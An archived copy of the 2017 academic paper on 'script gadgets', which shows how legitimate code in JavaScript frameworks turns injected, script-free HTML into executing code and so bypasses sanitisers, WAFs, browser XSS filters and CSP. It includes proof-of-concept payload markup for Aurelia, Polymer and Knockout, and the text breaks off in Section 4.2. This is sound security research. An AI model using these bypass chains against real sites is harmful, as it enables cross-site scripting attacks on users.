---
type: Whitepaper
title: ccs gadgets
description: Script gadgets are legitimate JavaScript fragments inside popular frameworks that pick up injected, script-free HTML and turn it into executing code. Because the injected markup carries no script tag or event handler, HTML sanitisers, web application firewalls, browser XSS filters and CSP all let it through. The authors find such gadgets in most modern frameworks and across many live sites.
resource: "https://raw.githubusercontent.com/google/security-research-pocs/master/script-gadgets/ccs_gadgets.pdf"
tags: [whitepaper, webseclist-reference, xss, gadget-chain, sanitizer-bypass, csp, filter-bypass, waf-bypass, dom, javascript, measurement-study]
generated:
  by: webseclist-refs/1
  at: "2026-08-14T22:35:37+00:00"
status: stable
stale_after: 2027-08-14
sources:
  - id: original
    resource: "https://raw.githubusercontent.com/google/security-research-pocs/master/script-gadgets/ccs_gadgets.pdf"
    title: ccs gadgets
    author: Sebastian Lekies, Krzysztof Kotowicz, Samuel Groß, Eduardo A. Vela Nava, Martin Johns
also_at: []
authors:
  - Sebastian Lekies
  - Krzysztof Kotowicz
  - Samuel Groß
  - Eduardo A. Vela Nava
  - Martin Johns
canonical_url: ""
cited_by:
  - "2016-17.md:30"
commit: ""
content_sha256: 014d3ecf3c496ca920004c69dfb6210fc0e7e20e63994a065510e5db550f11a3
depth: full
depth_reason: default
kind: whitepaper
language: ""
licence: unknown
original_url: "https://raw.githubusercontent.com/google/security-research-pocs/master/script-gadgets/ccs_gadgets.pdf"
published: ""
publisher: ""
publisher_english: ""
raw_sha256: 9bc7dd6f063509ecffef7c178ef817e788f1d57319f27deda422c4b40704ff29
retrieved_from: "https://raw.githubusercontent.com/google/security-research-pocs/master/script-gadgets/ccs_gadgets.pdf"
retrieved_kind: manual-import
retrieved_utc: "2026-08-14T22:35:37+00:00"
slug: ccs-gadgets
snapshot: ""
title_english: ""
translation_file: ""
translation_of: ""
---

# ccs gadgets

**ccs gadgets** - Sebastian Lekies, Krzysztof Kotowicz, Samuel Groß, Eduardo A. Vela Nava, Martin Johns, Publisher not stated.

- Published: date not stated
- Original: <https://raw.githubusercontent.com/google/security-research-pocs/master/script-gadgets/ccs_gadgets.pdf>
- Preserved from: https://raw.githubusercontent.com/google/security-research-pocs/master/script-gadgets/ccs_gadgets.pdf (manual-import) on 2026-08-14
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source from the Web Hacking Techniques Index collections, kept so the
page going offline. To read the original, follow the link above.

## Content

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

# ccs gadgets

Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting
                 Mitigations via Script Gadgets
                  Sebastian Lekies                                         Krzysztof Kotowicz                                  Samuel Groß
                        Google                                                     Google                                         SAP
                 slekies@google.com                                            koto@google.com                            mail@samuel-gross.com

                                           Eduardo A. Vela Nava                                        Martin Johns
                                                     Google                                                SAP
                                                 evn@google.com                                   martin.johns@sap.com

ABSTRACT                                                                                    1   INTRODUCTION
Cross-Site Scripting (XSS) is an unremitting problem for the Web.                           Web technology is moving forward at a rapid pace. Everyday new
Since its initial public documentation in 2000 until now, XSS has                           frameworks and APIs are pushed to production. This constant
been continuously on top of the vulnerability statistics. Even though                       development also leads to a change in attack surface and vulner-
there has been a considerable amount of research [15, 18, 21] and                           abilities. In this process Cross-Site Scripting (XSS) vulnerabilities
developer education to address XSS on the source code level, the                            have evolved significantly in the recent years. The traditional re-
overall number of discovered XSS problems remains high. Because                             flected XSS issue is very different from modern DOM-based XSS
of this, various approaches to mitigate XSS [14, 19, 24, 28, 30] have                       vulnerabilities such as mXSS [12], or expression-language-based
been proposed as a second line of defense, with HTML sanitiz-                               XSS [10]. While the topic of XSS becomes increasingly more com-
ers, Web Application Firewalls, browser-based XSS filters, and the                          plex, many mitigation techniques only focus on the traditional and
Content Security Policy being some prominent examples. Most of                              well-understood reflected XSS variant.
these mechanisms focus on script tags and event handlers, either                               In this paper, we present a novel Web attack which demonstrates
by removing them from user-provided content or by preventing                                that many mitigation techniques are inefficient when confronted
their script code from executing.                                                           with modern JavaScript libraries. At the core of the presented attack
   In this paper, we demonstrate that this approach is no longer                            are so-called script gadgets, small fragments of JavaScript contained
sufficient for modern applications: We describe a novel Web attack                          in the vulnerable site’s legitimate code. Generally speaking, a script
that can circumvent all of theses currently existing XSS mitiga-                            gadget is piece of JavaScript code which reacts to the presence
tion techniques. In this attack, the attacker abuses so called script                       of specifically formed DOM content in the Web document. In a
gadgets (legitimate JavaScript fragments within an application’s                            gadget-based attack, the adversary injects apparently harmless
legitimate code base) to execute JavaScript. In most cases, these                           HTML markup into the vulnerable Web page. Since the injected
gadgets utilize DOM selectors to interact with elements in the Web                          content does not carry directly executable script code, it is ignored
document. Through an initial injection point, the attacker can inject                       by the current generation of XSS mitigations. However, during
benign-looking HTML elements which are ignored by these mitiga-                             the web application lifetime, the site’s script gadgets pick up the
tion techniques but match the selector of the gadget. This way, the                         injected content and involuntarily transform its payload into exe-
attacker can hijack the input of a gadget and cause processing of his                       cutable code. Thus, script gadgets introduce the practice of code-reuse
input, which in turn leads to code execution of attacker-controlled                         attacks [27], comparable to return-to-libc , to the Web.
values. We demonstrate that these gadgets are omnipresent in al-                               To explore the severity and prevalence of the underlying vul-
most all modern JavaScript frameworks and present an empirical                              nerability pattern, we conduct a qualitative and quantitative study
study showing the prevalence of script gadgets in productive code.                          of script gadgets. For this, we first identify the various gadget
As a result, we assume most mitigation techniques in web applica-                           types, considering their functionality and their potential to un-
tions written today can be bypassed.                                                        dermine existing XSS mitigations. Furthermore, we examine 16
                                                                                            popular JavaScript frameworks and libraries, focusing on contained
CCS CONCEPTS                                                                                script gadgets and mapping the found gadget instances to the af-
• Security and privacy → Browser security; Web application                                  fected XSS mitigations. For instance, in 13 out of the 16 examined
security; Intrusion detection systems; Firewalls; Penetration testing;                      code-bases we found gadgets capable to circumvent the emerging
Web protocol security;                                                                      strict-dynamic variant of the Content Security Policy [34]. Fi-
                                                                                            nally, we report on a large-scale empirical study on the prevalence
                                                                                            of script gadgets in popular web sites.
Permission to make digital or hard copies of part or all of this work for personal or          By crawling the Alexa top 5000 Web sites and their first-level
classroom use is granted without fee provided that copies are not made or distributed
for profit or commercial advantage and that copies bear this notice and the full citation   links, we measured gadget-related data flows for approximately
on the first page. Copyrights for third-party components of this work must be honored.      650,000 individual crawled URLs. In total, we measured 4,352,491
For all other uses, contact the owner/author(s).
                                                                                            sink executions with data retrieved from the DOM. Using our fully-
CCS ’17, Dallas, TX, USA
© 2017 Copyright held by the owner/author(s). 978-1-4503-4946-8/17/10. . . $15.00           automated exploit generation framework, we generated exploits
DOI: 10.1145/3133956.3134091                                                                and verified gadgets on 19.88% of all domains in the data set. As
we applied a very conservative, but false-positive-free verification        and/or JavaScript into Web content that is not legitimately under
approach, we believe that this number is just a lower bound and             their control. XSS vulnerabilities are generally categorized based on
that the numbers of gadgets are considerably higher in practice.            the location of the vulnerable source code, i.e., server- or client-side
   In particular, this paper makes the following contributions:             XSS, and the persistence of the injected attack code, i.e., reflected
      • To the best of our knowledge, we are the first researchers to       or stored XSS.
         systematically explore this new Web attack that allows to             XSS can be avoided through secure coding practices, which
         circumvent popular XSS mitigation techniques by abusing            mainly rely on the careful handling of attacker controlled input
         script gadgets. We describe the attack in detail and give a        and context-aware sanitization/encoding of untrusted data before
         categorization of different types of gadgets.                      processing it in a security sensitive context. For brevity, we’ll omit
      • In order to explore script gadgets in detail, we present the        further details on the basic vulnerability class and refer to the vast
         results of a manual study on 16 modern JavaScript libraries.       body of existing work on the topic [7, 8, 17, 18, 21, 31].
         Based on proof-of-concept exploits we demonstrate that
         almost all of these libraries contain gadgets. Furthermore,        2.3      XSS Mitigation Techniques
         we demonstrate how these different script gadgets can              The basic XSS problem has been recognized since the beginning
         be used to circumvent all 4 popular classes of mitigation          of the decade [5], the root cause is understood, and a significant
         techniques: The Content Security Policy, HTML sanitizers,          amount of work has been done to design approaches to detect and
         Browser-based XSS filters and Web Application Firewalls.           prevent XSS issues in source code. XSS is statistically still the most
      • Based on the results of the manual study, we built a tool           common vulnerability class however, and there seems to be no
         chain capable of automatically detecting and verifying gad-        overall decline in its prevalence. It therefore seems safe to assume
         gets at scale. Based on this tool, we conducted an empirical       that XSS problems will not be solved completely with secure coding
         study of the Alexa top 5000 Web sites including more than          practices alone.
         650k Web pages. The results of this study suggests that               For this reason various XSS mitigations have been introduced as
         script gadgets are omnipresent in modern JavaScript-heavy          an important second line of defense. Instead of removing the under-
         applications. While our study is very conservative when            lying vulnerability, XSS mitigations aim to prevent the exploitation
         measuring gadgets, we managed to detect and verify gad-            of the vulnerability by stopping the execution of the injected script
         gets in 19.88% of all domains. This number just represents         code. XSS mitigations are widely implemented in four different
         a lower bound and is likely much higher in practice.               forms:

2 TECHNICAL BACKGROUND                                                            (1) HTML Sanitizers. These are libraries used by developers
                                                                                      to clean untrusted HTML into HTML that is safe to use
2.1 JavaScript, HTML and the DOM                                                      within the application. This category contains examples
Since its development, JavaScript has been used to interact                           such as DOMPurify1 and Google Closure2 HTML sanitizer.
with the DOM to make HTML documents more interactive.                             (2) Browser XSS Filters. These filters are implemented as
To do this, JavaScript working in the browser uses many                               part of the browser navigation and rendering, and they
different ways to read data from the DOM. Most of the cor-                            attempt to detect an XSS attack and neuter it. Internet
responding functions such as document.getElementById                                  Explorer, Edge, and Chrome implement XSS filters as part
or document.getElementsByClassName are based on DOM                                   of their default configuration. Firefox does not have one,
selectors[33] by providing convenient wrappers around                                 but the popular NoScript3 AddOn implements one.
document.querySelectorAll.                                                        (3) Web Application Firewalls. This is software that runs on
   DOM selectors are a powerful pattern language that can be used                     the server, and attempts to allow benign requests from web
to query the DOM for certain elements, and therefore are the basis                    traffic, while detecting and blocking malicious requests. An
for all modern JavaScript frameworks. For example, one of the most                    example of an open-source Web Application Firewall is
famous JavaScript functions - jQuery’s $ function - enhances the                      ModSecurity4 with OWASP Common Rule Set5 .
browser-based selector language with a lot of syntactic sugar. In                 (4) Content Security Policy [34]. This is a browser feature
the following table, we describe some selector features in detail:                    that a web developer can configure to define a policy that
                                                                                      allows the browser to whitelist the JavaScript code that
Selector        E.g.     Matches...                                                   belongs to the application.
Tag-based       div      div elements                                          These mitigations all fundamentally rely one of three basic strate-
Id-based        #foo     elements with id ’foo’                             gies:
Class-based     .foo     elements with class ’foo’                                (1) Request filtering blocks HTTP requests before they
Attr.-based     [foo]    elements with an attribute named ’foo’                       reach the application, working either at the browser level

                                                                            1 https://github.com/cure53/DOMPurify

2.2    Cross-site Scripting (XSS)                                           2 https://github.com/google/closure-library
                                                                            3 https://noscript.net/
The term Cross-site Scripting (XSS) [29] describes a class of string-       4 https://modsecurity.org/
                                                                            5 https://github.com/SpiderLabs/owasp-modsecurity-crs
based code injection vulnerabilities that let adversaries inject HTML
                                                                        2
          (like NoScript), or at the network or application level (like       // Userland code
          WAFs).                                                              var button = document.getElementById("button");
      (2) Response sanitization focuses on detecting malicious                button.getAttribute("data-text");
          code and sanitizing it out of the response. Examples of
          these are HTML sanitizers, as well as Internet Explorer’s           var links = $("a[href]").children();
          and Edge’s XSS filter.
      (3) Code filtering detects malicious JavaScript just before it          // Reading 'ref' attributes in Aurelia framework
          is executed and tries to detect whether it is benign or not.        if (attrName === 'ref') {
          Examples of this strategy include CSP and Chrome’s XSS                    info.attrName = attrName;
          filter.                                                                   info.attrValue = attrValue;
                                                                                    info.expression = new NameExpression(
   We will go into more details about the implementation of such                      this.parser.parse(attrValue), 'element',
strategies and the ways to bypass them in Section 4.                                  resources.lookupFunctions);=
                                                                              }
3     SCRIPT GADGETS                                                          // Vue.js reading from v-html attribute
In this section, we introduce the concept of script gadgets, explain-         if ((binding = el.attrsMap['v-html'])) {
ing how injecting a benign HTML markup may result in arbitrary                  return [{ type: EXPRESSION, value: binding }]
JavaScript execution by reusing parts of legitimate application code          }
and how this can be used to negate the effects of XSS mitigations.
                                                                                             Listing 2: Reading data from the DOM
3.1     Benign HTML markup
XSS mitigation techniques described in Section 2.3 aim to stop XSS              By injecting benign HTML markup matching DOM selectors
attacks by blocking execution of illegitimate, injected JavaScript            used in the application we are able to trigger the execution of
code. Mitigations detect the injected code, present in inline event           specific pieces of legitimate application code 6 - script gadgets.
handlers or in separate script elements and prevent its execu-
tion, while legitimate JavaScript code, carrying appropriate trust            3.3     Script Gadgets - Introduction
information, is left as-is and is allowed to execute.
   Those XSS mitigations ignore injected HTML markup that would               Script gadgets are fragments of legitimate JavaScript code belonging
not result in JavaScript execution - we’ll call such markup benign            to the web application that execute as a result of benign HTML
HTML. Benign HTML does not contain <script> tags, inline event                markup present in the web page. Script gadgets are not injected
handlers, src or href attributes with javascript: or data: URLs,              by the attacker - they are already present either in the user-land
or other tags capable of JavaScript execution (<link rel=import>,             web application code, or one of the libraries/frameworks used by
<meta>, <style>). The following snippet is an example of benign               the web application.
HTML:                                                                            Our research explores using script gadgets to bypass XSS miti-
                                                                              gations. In order to do that, gadgets must both result in arbitrary
                                                                              script execution, and be triggered from benign HTML injection.
                                                                              For example, a web application might assign a value read from the
<div class="greeting">                                                        DOM to the innerHTML property of an element:
  <b>Hello</b> world!
</div>
                                                                              var button = getElementById("my-button");
                                                                              button.innerHTML = button.getAttribute("data-text");
Listing 1: Benign HTML markup ignored by the mitigation

                                                                                              Listing 3: Simple innerHTML gadget


3.2     DOM selectors                                                           Simple gadgets like these are often explored in the context of
The presence of benign HTML in a document does not directly                   DOM XSS vulnerabilities [16], but for the purpose of this research
trigger code execution. However, in virtually all web applications            we propose a new classification of gadgets of varying complexity.
JavaScript code already present in the page interacts with the DOM,           But first we’ll explain how to use script gadgets in attacks against
reading data from the document by using various DOM selectors                 XSS mitigations.
(2.1). For example, a web application might take all elements with a
tootltip attribute to decorate them by showing a given text when              6 An alternative way of triggering specific code paths in a web application from benign
the user selects these elements. JavaScript code reading data from            markup is DOM clobbering. DOM clobbering allows markup to override variables
the DOM based on a selector is a common pattern in both user-land             in JavaScript execution environment, making it possible to trigger specific script
                                                                              behavior. While we have identified working bypasses of some XSS mitigations via
and library code - example code snippets might look like this:                DOM clobbering, for clarity we focus only on DOM selector-based code triggers.
                                                                          3
3.4     Attack Outline                                                           3.5.1 String manipulation gadgets. These gadgets transform
In this paper, we introduce a novel XSS attack that relies on script          their string input by using regular expressions, character replace-
gadgets to cause the execution of the adversary’s JavaScript code.            ment and other types of string manipulation. When present, they
                                                                              can be used to bypass mitigations based on pattern matching. For
   Attacker model: The applicable attacker is the classic XSS at-             example, the following gadget can be used to bypass some mitiga-
tacker [29], who is able to inject arbitrary HTML code into the               tions by using the inner-h-t-m-l attribute name that will later on
content of the attacked web document. In the context of this paper            be used by Polymer framework to assign to element’s innerHTML
whether the injection technique used is reflected or stored XSS is            property.
irrelevant.
   As discussed above, existing XSS mitigations rely on the basic
                                                                              dash.replace(/-[a-z]/g, (m) => m[1].toUpperCase())}
assumption that malicious code is being directly injected into the
affected page in the course of an XSS attack. All non-script carrying,
injected HTML content is therefore assumed to be benign and                           Listing 4: Camel-casing the input in Polymer
remains untouched by the mitigation. This assumption is exploited
by the proposed attack method. The HTML code injected by the
attacker exposes two characteristics:                                            Similar features are present in AngularJS frameworks, which
                                                                              allows the attackers to use benign data attributes in place of ng-
      (1) The actual attack payload, for example the attack’s                 attributes that would be blocked by HTML sanitizers:
          JavaScript, is contained in the benign HTML in a non-
          executable form.
      (2) The HTML is specifically crafted so that its presence in            var PREFIX_REGEXP = /^((?:x|data)[:\-_])/i;
          the web document triggers a script gadget already con-              var SPECIAL_CHARS_REGEXP = /[:\-_]+(.)/g;
          tained in the web page’s legitimate JavaScript code. In other       function directiveNormalize(name) {
          words, the injected HTML payload triggers a code-reuse                return name.replace(PREFIX_REGEXP, '')
          attack, similar to ret2libc techniques used in exploitation             .replace(SPECIAL_CHARS_REGEXP, fnCamelCaseReplace);
          of memory-corruption vulnerabilities.                               }

   In the course of an attack, a script gadget accesses the injected
DOM content and uses the contained information in an insecure                    Listing 5: Directive name normalization in AngularJS
manner, ultimately leading to the execution of the adversary’s code,
which was hidden in the benign HTML code. In summary, the class
                                                                                 3.5.2 Element construction gadgets. These gadgets create new
of attacks described in this paper follows this basic pattern:
                                                                              DOM elements. For XSS mitigation bypass purposes, we’re mostly
      (1) Injection into the raw HTML. The attacker controls the              focused on identifying gadgets that may programmatically create
          DOM of the webpage and injects a payload that triggers              new script elements.
          script gadgets in the application code. This payload con-
          tains only benign HTML markup and matches the DOM
          selectors used by the web application.                              document.createElement(input)
      (2) Mitigation attempt. An XSS mitigation inspects the in-              document.createElement("script")
          jected content, trying to detect script insertion. The benign       jQuery("<" + tag + ">")
          HTML markup is left as-is.                                          jQuery.html(input) // if input contains <script>
      (3) Gadgets transforms the markup. Gadgets present in
          the legitimate JavaScript code take the injected payload                    Listing 6: Example element creation gadgets
          from the DOM using the DOM selectors and transform it
          into JavaScript statements.
      (4) Script executes. The transformed JavaScript statements                 One notable element construction gadget is present in jQuery’s
          are executed, resulting in XSS.                                     $.globalEval function. This function creates a new script ele-
                                                                              ment, sets its text property and appends the element to the DOM,
   The precise ways to abuse gadgets to bypass XSS mitigations de-            executing the code. $.globalEval combines an element creation
pend on the type of mitigation and implemented mitigation strategy,           gadget with a JavaScript execution gadget (3.5.4). As $.globalEval
as we described in Section 2.3                                                is called in various common jQuery methods (e.g. $.html), a con-
                                                                              trolled input to those may create new script elements, which is a
3.5     Gadget Types                                                          useful property for bypassing strict-dynamic CSP (see 4.4)
We identified several types of script gadgets useful in bypassing XSS            3.5.3 Function creation gadgets. These gadgets create new
mitigations. Some of them may result in indirect script execution             Function objects. The function body is usually composed of a mix
on their own; others need to be combined in chains to be useful in            of the input and constant strings. Note that the created function
an attack.                                                                    object needs to be executed by a different gadget.
                                                                          4
// Knockout Function creation gadget.                                         can be typically identified in the framework expression parsing and
var body = "with($context){with($data||{}){return{" +                         evaluation engine which can lead to arbitrary code execution. For
  rewrittenBindings + "}}}";                                                  example, the following gadgets can be found in Aurelia’s expression
return new Function("$context", "$element", body);                            parser:

// Underscore.js Function creation gadget.                                    if (this.optional('.')) { // Property access
source = "var __t,__p='',__j=Array.prototype.join," +                          result = new AccessMember(result, name);}
  "print=function(){__p+=__j.call(arguments,'');};\n" +                       }
  source + 'return __p;\n';                                                   AccessMember.prototype.evaluate = function(...) {
var render = new Function(                                                     return instance[this.name];
  settings.variable || 'obj', '_', source);                                   };
                                                                              if (this.optional('(')) { // Function call
            Listing 7: Example function creation gadgets                       result = new CallMember(result, name, args);
                                                                              }
                                                                              CallMember.prototype.evaluate = function(...) {
   3.5.4 JavaScript execution sink gadgets. These gadgets are usu-             return func.apply(instance, args);
ally standalone, or are the last in the constructed gadget chain,             };
taking the input from the previous gadgets and putting it into a
DOM XSS[16] JavaScript execution sink.
                                                                              Listing 10: Script gadgets in Aurelia expression parser (sim-
                                                                              plified code)
eval(input);
inputFunction.apply();
node.innerHTML = "prefix" + input + "suffix";                                   It’s possible to link the above script gadgets into chains that
jQuery.html(input);                                                           execute arbitrary functions such as window.alert - all by using
scriptElement.src = input;                                                    only benign HTML markup injection. (Aurelia looks for ref and
node.appendChild(input);                                                      *.bind attributes in the document - that triggers our gadgets).


              Listing 8: Example execution sink gadgets                       <div ref=me
                                                                               s.bind="$this.me.ownerDocument.defaultView.alert(1)"
                                                                              ></div>
   3.5.5 Gadgets in expression parsers. Some modern JavaScript
frameworks (for example, Aurelia7 , AngularJS8 , Polymer9 , Rac-
tive.js10 , Vue.js11 ) interpret parts of the DOM tree as templates for       Listing 11: HTML Markup triggering gadget chain in Aurelia
the application UI components. Those templates contain expres-
sions written in framework-specific expression languages to bind a               In a similar fashion, the following benign HTML markup may
result of expression evaluation to a given position in the rendered           trigger a gadget chain calling alert in Polymer 1.x:
UI. For example, the following expression displays a capitalized
customer name:
                                                                              <template is=dom-bind><div
                                                                               c={{alert('1',ownerDocument.defaultView)}}
<td>${customer.name.capitalize()}</td>                                         b={{set('_rootDataHost',ownerDocument.defaultView)}}>
                                                                              </div></template>
                Listing 9: Sample expression in Aurelia
                                                                              Listing 12: HTML Markup triggering gadget chain in Poly-
   The framework extracts the template definition from the DOM,               mer 1.x
identifies embedded expressions by searching for appropriate code
delimiters (here: ${ and }), parses the expressions into an AST, and
evaluates them when the UI is rendered.                                       3.6    Expressiveness of Gadget-based Exploits
   If the expression language syntax is expressive enough, attackers          In this section we discuss the expressiveness of gadget-based miti-
can create expressions resulting in arbitrary JavaScript code exe-            gation bypasses. Via gadgets, an attacker is able to execute arbitrary,
cution - for example by traversing a prototype chain or accessing             Turing-complete code. In general, we identified three ways of doing
object constructors [9] [10]. We found that various script gadgets            so:
7 http://aurelia.io/
                                                                                    • Eval-like functions: If a gadget is able to trigger a call
8 https://angularjs.org/
9 https://www.polymer-project.org/                                                     to eval or another eval-like function, executing arbi-
10 http://www.ractivejs.org/                                                           trary code is straightforward. In our examples, we usually
11 https://vuejs.org/                                                                  demonstrate how the gadget is able to call a single function
                                                                          5
        inside the window object with a single attacker-controlled                3.7.2 Taint tracking. A subset of gadgets may be identified by
        parameter (e.g. alert(1)). As the eval function is also               rendering the web application in a browser enriched with a taint-
        located inside the window object and accepts one or more              tracking engine [17]. By marking the entirety of DOM tree as tainted
        parameters, all of these examples are capable of executing            (i.e. simulating that the attacker has a reflected HTML injection
        arbitrary, Turing-complete JavaScript code.                           capability), and checking whether tainted values reach specific
      • Appending a script element: Another class of gadgets                  JavaScript execution sinks, we were able to identify flows linking
        aims at appending a script element with either an attacker-           certain DOM selectors with JavaScript execution. While this ap-
        controlled src attribute or an attacker-controlled script             proach is effective at scale, it has the limitation of only discovering
        body. Similar to eval-based gadgets, this allows an attacker          gadgets that are already used in a given web application (albeit not
        to execute arbitrary code.                                            neccesarily for script execution).
      • Abusing the expressiveness of an expression lan-                          In this research, we used the taint tracking approach to evaluate
        guage: Most gadget-based mitigation bypasses leverage                 script gadget prevalence in user-land code (5.4).
        eval-like functions or new script elements. However, in
        Web applications employing some variants of CSP (see Sec-             4     CONCRETE XSS MITIGATION BYPASSES
        tion 4.1.1), it is not possible to use these bypass methods. In             USING SCRIPT GADGETS
        these cases, we can leverage expression languages to gain
        arbitrary code execution. All expression languages that we            In this section, we provide detailed information on how script gad-
        investigated are Turing-complete. If an exploit is able to            gets can be leveraged to circumvent concrete state-of-the-art XSS
        execute the expression interpreter, the exploit is as expres-         mitigations. We’ll follow the countermeasure classifications, based
        sive as the expression language itself. However, even if the          on their underlying mechanisms, that we introduced in Section 2.3.
        expression language itself is not Turing-complete, we can
        still gain Turing-complete code execution in some cases.              4.1     Gadgets in Popular JavaScript Libraries
        Listing 17, for example, shows a very simple expression-              In order to measure the effectiveness of gadgets in bypassing XSS
        based attack to steal and reuse a CSP nonce in order to               mitigations, we needed to collect:
        add a seemingly trusted script, that allows us to achieve
        arbitrary JavaScript code execution.                                        (1) A list of XSS mitigation implementations with different
                                                                                        strategies
                                                                                    (2) A list of as many gadgets as possible in popular frameworks
3.7    Finding Script Gadgets                                                           and libraries
Script gadgets (3.3) on their own are legitimate, trusted JavaScript
statements or code blocks. While some of them (3.5.4) are also                   4.1.1 Collecting a list of popular XSS mitigations. We selected
DOM XSS [16] sinks, others are as benign as property assignment,              XSS mitigations that were either open-source, or widely distributed.
or property traversal statements. This fact makes it particularly             We also wanted a cross-section different mitigation implementation
difficult to identify such gadgets in the web application codebase.           strategies. The mitigations we decided to test were:
   We found the following two techniques are useful to identify
                                                                                     • Content Security Policy using different types of code
script gadgets:
                                                                                       filtering:
   3.7.1 Manual code inspection. First of all, gadgets can be found                       – Whitelist-based where code is trusted based on
manually or with the assistance of static-analysis tools. Finding                            where it originates.
some of the simpler gadget types (for example, JS execution sinks or                      – Nonce-based where code is trusted only if it’s accom-
Function creation gadgets) is straightforward. We found that more                            panied by a secret cryptographic nonce.
complex gadgets, especially the ones present in expression parsers,                       – Unsafe-eval source expression is usually used to-
require significant effort to locate and evaluate for usefulness. A                          gether with other policies, but looking at it separately
gadget may only be used if it’s reachable from a benign HTML                                 allows us to investigate eval-based gadgets.
markup injection. For example, any property access, property setter,                      – Strict-dynamic source expression is usually used to-
or function call may potentially be useful in a chain, but only if the                       gether with a nonce-based CSP to automatically prop-
property name or function object may be directly controlled from                             agate the trust of a nonced script to all script elements
the markup.                                                                                  generated by it.
   We found that manual code inspection makes it possible to find                    • Client-side HTML sanitizers using different approaches
gadgets that would not otherwise be triggered in the usual applica-                    of sanitization:
tion code flow. For example, in Polymer 1.x (see Listing 12) we were                      – DOMPurify is a JavaScript-based HTML sanitizer
able to determine that overriding a _rootDataHost property lets us                           that supports HTML, SVG, MathML, among others.
execute JavaScript statements in a different scope, which lets us trig-                   – Google’s Closure library contains another
ger subsequent gadgets in the chain. This "private" _rootDataHost                            JavaScript-based HTML sanitizer that only supports
property was never meant to be accessible from Polymer expres-                               HTML.
sions.                                                                               • Web Application Firewalls are request filtering mitiga-
   In this research, we used manual code inspection to identify                        tions deployed as hardware in front of web servers, as well
gadgets in modern JavaScript frameworks (4.1).                                         as as software next to the web server itself.
                                                                          6
                                       CSP                                 XSS Filters           HTML Sanitizers                          WAFs
         Whitelists      Nonces       Unsafe-eval Strict-dynamic Chrome Edge NoScript DomPurify Closure                                   ModSecurity
         3               4            10           13              13        9       9         9          6                               9
                                         Table 1: Mitigation-bypasses via gadgets in 16 Popular Libraries



            – ModSecurity is an open-source Web Application                               Table 2 within the Appendix also summarizes our research findings.
              Firewall, commonly used with the OWASP Core Rule                            For clarity, in the following sections we present and discuss only a
              Set.                                                                        chosen selection of those bypasses.
       • XSS filters employ either request filter, response sanitiza-
         tion or code filtering approaches.                                               4.2    Bypassing Request Filtering Mitigations
            – Chrome / Safari employs a code filtering approach,                          Request filtering mitigations attempt to identify malicious or un-
              blacklisting scripts that appear in the request.                            trusted HTML patterns, and stop them before they reach the appli-
            – Internet Explorer / Edge employs a response san-                            cation. To accomplish this, these mitigations generally employ the
              itization approach, rewriting potentially dangerous                         following approaches:
              responses with something safe.
                                                                                                • Enumerate known strings used in attacks. For ex-
            – NoScript employs a request filtering approach, block-
                                                                                                  ample, HTML tags like <script> or attributes such as
              ing requests that look suspicious or potentially mali-
                                                                                                  onerror allow the user to execute JavaScript with a single
              cious.
                                                                                                  HTML injection. The ModSecurity Core Rule Set version
   4.1.2 Collecting a list of popular JavaScript libraries. In order to                           3.0 is, at the time of writing, one of the most comprehensive
find as many different gadgets as possible to test against mitigations,                           lists of attack vectors.
we decided to search for gadgets in different popular JavaScript                                • Detect characters used to escape from the contexts
frameworks and libraries. We obtained the lists of popular frame-                                 where XSS vulnerabilities usually occur. For example,
works and libraries from various online resources12 13 14 15 16 . From                            if an XSS vulnerability existed by directly injecting HTML
those lists, we focused on searching for gadgets in the following                                 where the application expected to just output text, a request
frameworks (selected based on popularity and code familiarity by                                  filtering mitigation will attempt to detect the injection of
the authors):                                                                                     < or >. If the vulnerability is present when injecting inside
       • Trending JavaScript frameworks (Vue.js, Aurelia, Poly-                                   an HTML attribute, escaping from the attribute would be
         mer)                                                                                     detected as the vulnerability.
       • Widely popular frameworks (AngularJS, React, Em-                                       • Detect patterns and sequences frequently used in ex-
         berJS)                                                                                   ploits. For example, when an XSS attack is succesful, the
       • Older still popular frameworks (Backbone, Knockout,                                      user will often attempt to steal credentials, or issue HTTP
         Ractive, Dojo)                                                                           requests. Therefore, some mitigations attempt to detect ac-
       • Libraries and compilers (Bootstrap, Closure, RequireJS)                                  cess to document.cookie, or access to XMLHTTPRequest.
       • jQuery-based libraries (jQuery, jQuery UI, jQuery Mo-                                    They also attempt to detect usual mechanisms to obfuscate
         bile)                                                                                    code execution, like references to eval or innerHTML, even
                                                                                                  after doing several layers of agressive decoding.
   The process we used for manually identifying gadgets is de-
scribed in Section 3.7.1, but generally it was done by identifying                          Examples of XSS mitigations that adopt these approaches are:
HTML and eval-based sinks, as well as any documented feature that                               • NoScript XSS Filter
seemed like an expression language. In cases when no sinks of that                              • Web Application Firewalls
form were reachable, we then looked for any mechanism exposed                                Request filtering mitigations detect only specific, XSS-related
by the framework or library that touched the DOM in any way, and                          HTML tags and attributes. Gadgets use HTML tags and attributes
manually audited the code.                                                                that are considered benign, and that makes them capable of bypass-
   In Table 1 we summarize how many frameworks had gadgets that                           ing such mitigations. For example, if a library takes the value of the
could bypass each of the mitigations. Complete bypass collection                          data-html attribute and executes it as HTML, mitigations in this
found during this analysis is available in the GitHub repository17 .                      group would not be able to detect that as malicious. An example of
12 Mustache                                                                               HTML markup triggering such gadget chain was shown in Listing
                  Security    is   a    list  of      frameworks      with gadgets.
https://github.com/cure53/mustache-security/tree/master/wiki                              11.
13 GitHub contains a list of trending front-end JavaScript frameworks.
                                                                                             In addition, detection of context-breaking characters suddenly
https://github.com/showcases/front-end-javascript-frameworks                              becomes ineffective because some gadgets change the meaning
14 TodoMVC is a list of a sample application written in many different JavaScript
frameworks. http://todomvc.com/                                                           of otherwise-safe text sequences, and make them dangerous. For
15 JS.org Rising Stars 2016 is based on the activity on different GitHub projects
                                                                                          example, in AngularJS the use of two curly braces {{ is a way to
related to JavaScript frameworks in 2016. https://risingstars2016.js.org/                 define the beginning of an AngularJS expression. Aurelia, in turn,
16 State    of JS 2016 is based on a survey to web developers.
http://stateofjs.com/2016/frontend/                                                       uses a different delimiter: ${. An example of such seemingly-benign
17 https://github.com/google/security-research-pocs                                       markup was shown in Listing 9.
                                                                                      7
<iframe src="//knockout.example.com/?xss=                                      gadgets must reuse an otherwise safe and whitelisted attribute,
      <div data-bind=value:a=location></div>                                   such as class or id. Gadgets that bypass XSS filters can also use
      <div data-bind=value:a.href=name></div>"                                 custom HTML tags and attributes such as ng-click in Angular or
